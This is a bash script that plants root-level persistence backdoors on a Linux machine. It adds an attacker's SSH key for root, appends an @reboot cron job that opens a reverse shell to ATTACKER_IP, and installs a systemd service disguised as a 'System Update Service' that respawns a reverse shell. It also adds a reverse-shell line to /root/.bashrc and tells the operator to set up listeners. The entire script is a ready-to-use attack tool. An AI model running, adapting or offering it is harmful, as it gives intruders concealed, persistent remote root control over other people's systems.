#!/bin/bash

# === CONFIG ===
ATTACKER_IP="Fill in"
SSH_KEY="Fill in"
SYSTEMD_PORT="5555"
CRON_PORT="6666"
BASHRC_PORT="7777"

echo "[*] Dropping root-level persistence backdoors..."

# === SSH KEY BACKDOOR ===
echo "[+] Enabling SSH public key authentication..."
sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd

echo "[+] Adding SSH key for root..."
mkdir -p /root/.ssh
echo "$SSH_KEY" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# === SYSTEM-LEVEL CRON JOB ===
echo "[+] Adding @reboot cronjob to /etc/crontab..."
echo "@reboot root bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$CRON_PORT 0>&1'" | tee -a /etc/crontab

# === SYSTEMD REVERSE SHELL SERVICE ===
echo "[+] Installing systemd reverse shell service..."
cat <<EOF > /etc/systemd/system/update-check.service
[Unit]
Description=System Update Service

[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$SYSTEMD_PORT 0>&1"
Restart=always
RestartSec=5
TimeoutStartSec=0
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl enable update-check.service
systemctl start update-check.service

# === ROOT BASHRC TRIGGER ===
echo "[+] Adding reverse shell trigger to /root/.bashrc..."
echo "nohup bash -i >& /dev/tcp/$ATTACKER_IP/$BASHRC_PORT 0>&1 &" >> /root/.bashrc

# === Completion ====
echo "[✔] All root persistence methods installed successfully."
echo "Make sure to set up listeners on ports: $SYSTEMD_PORT, $CRON_PORT and $BASHRC_PORT"
